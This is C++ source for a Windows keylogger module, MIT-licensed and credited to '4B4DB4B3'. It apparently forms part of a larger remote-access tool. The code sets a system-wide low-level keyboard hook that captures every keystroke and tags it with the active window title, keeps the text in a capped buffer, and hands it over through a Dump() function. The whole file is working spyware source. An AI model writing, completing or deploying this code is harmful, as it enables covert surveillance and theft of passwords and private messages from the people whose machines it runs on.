/*
MIT License
Copyright (c) 2020 4B4DB4B3

Low-level keyboard hook keylogger.
- WH_KEYBOARD_LL captures all keystrokes system-wide.
- Active window title is recorded on window focus change to give context.
- Buffer is capped at 64 KB; Dump() returns it and clears it.
- Thread-safe via a CRITICAL_SECTION.
*/
#pragma warning(disable: 4996)

#include "Keylogger.h"
#include <windows.h>
#include <string>

namespace Keylogger {

// ── State ─────────────────────────────────────────────────────────────────────

static HHOOK             g_hook      = nullptr;
static HANDLE            g_thread    = nullptr;
static DWORD             g_threadId  = 0;
static volatile bool     g_running   = false;
static CRITICAL_SECTION  g_cs;
static bool              g_csInit    = false;
static std::string       g_buffer;
static std::string       g_lastWin;

// ── Helpers ───────────────────────────────────────────────────────────────────

static void EnsureCS() {
    if (!g_csInit) { InitializeCriticalSection(&g_cs); g_csInit = true; }
}

static std::string ActiveWindowTitle() {
    char buf[256] = {};
    HWND h = GetForegroundWindow();
    if (h) GetWindowTextA(h, buf, sizeof(buf) - 1);
    return std::string(buf);
}

// ── Low-level keyboard hook ───────────────────────────────────────────────────

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        DWORD vk = kb->vkCode;

        std::string ch;

        switch (vk) {
            case VK_RETURN:  ch = "\n";     break;
            case VK_BACK:    ch = "[BS]";   break;
            case VK_TAB:     ch = "\t";     break;
            case VK_SPACE:   ch = " ";      break;
            case VK_ESCAPE:  ch = "[ESC]";  break;
            case VK_DELETE:  ch = "[DEL]";  break;
            case VK_LEFT:    ch = "[<-]";   break;
            case VK_RIGHT:   ch = "[->]";   break;
            case VK_UP:      ch = "[UP]";   break;
            case VK_DOWN:    ch = "[DN]";   break;
            case VK_HOME:    ch = "[HOME]"; break;
            case VK_END:     ch = "[END]";  break;
            // Modifier keys generate no visible output
            case VK_SHIFT:   case VK_LSHIFT:   case VK_RSHIFT:
            case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
            case VK_MENU:    case VK_LMENU:    case VK_RMENU:
            case VK_LWIN:    case VK_RWIN:
            case VK_CAPITAL: case VK_NUMLOCK:  case VK_SCROLL:
            case VK_SNAPSHOT:
                break;
            default: {
                BYTE ks[256] = {};
                GetKeyboardState(ks);
                WORD out = 0;
                int r = ToAscii(vk, kb->scanCode, ks, &out, 0);
                if (r >= 1) {
                    char c = static_cast<char>(out & 0xFF);
                    if (c >= 0x20 && c < 0x7F)  // printable ASCII only
                        ch = std::string(1, c);
                } else {
                    // Non-ASCII / function key — show name in brackets
                    char name[64] = {};
                    LONG lp2 = static_cast<LONG>(kb->scanCode << 16);
                    if (kb->flags & LLKHF_EXTENDED) lp2 |= (1 << 24);
                    if (GetKeyNameTextA(lp2, name, sizeof(name)) > 0)
                        ch = std::string("[") + name + "]";
                }
                break;
            }
        }

        if (!ch.empty()) {
            EnsureCS();
            EnterCriticalSection(&g_cs);

            // Annotate when active window changes
            std::string win = ActiveWindowTitle();
            if (win != g_lastWin && !win.empty()) {
                g_buffer += "\n[Window: " + win + "]\n";
                g_lastWin = win;
            }
            g_buffer += ch;

            // Cap at 64 KB — drop oldest half when exceeded
            if (g_buffer.size() > 65536)
                g_buffer.erase(0, g_buffer.size() - 32768);

            LeaveCriticalSection(&g_cs);
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// ── Hook thread (needs a message loop for WH_KEYBOARD_LL) ────────────────────

static DWORD WINAPI HookThread(LPVOID) {
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (!g_hook) { g_running = false; return 1; }

    MSG msg;
    while (g_running) {
        // PeekMessage / sleep avoids blocking indefinitely when g_running → false
        if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_QUIT) break;
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        } else {
            Sleep(10);
        }
    }

    if (g_hook) { UnhookWindowsHookEx(g_hook); g_hook = nullptr; }
    return 0;
}

// ── Public API ────────────────────────────────────────────────────────────────

void Start() {
    if (g_running) return;
    EnsureCS();
    EnterCriticalSection(&g_cs);
    g_buffer.clear();
    g_lastWin.clear();
    LeaveCriticalSection(&g_cs);

    g_running = true;
    g_thread  = CreateThread(nullptr, 0, HookThread, nullptr, 0, &g_threadId);
}

void Stop() {
    if (!g_running) return;
    g_running = false;
    if (g_threadId) PostThreadMessage(g_threadId, WM_QUIT, 0, 0);
    if (g_thread) {
        WaitForSingleObject(g_thread, 3000);
        CloseHandle(g_thread);
        g_thread   = nullptr;
        g_threadId = 0;
    }
}

std::string Dump() {
    EnsureCS();
    EnterCriticalSection(&g_cs);
    std::string out = g_buffer;
    g_buffer.clear();
    g_lastWin.clear();
    LeaveCriticalSection(&g_cs);
    return out;
}

bool IsRunning() { return g_running && g_hook != nullptr; }

} // namespace Keylogger
